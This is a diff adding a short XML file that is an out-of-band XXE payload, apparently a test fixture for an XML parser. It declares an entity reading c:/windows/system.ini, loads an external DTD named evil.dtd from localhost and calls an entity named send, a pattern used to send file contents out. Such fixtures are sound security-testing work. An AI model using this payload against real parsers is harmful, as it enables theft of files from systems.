@@ -1,0 +1,7 @@
+﻿<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE root [
+	<!ENTITY % file SYSTEM "file:///c:/windows/system.ini">
+	<!ENTITY % dtd SYSTEM "http://localhost:5050/evil.dtd">
+	%dtd;
+]>
+<root>&send;</root>
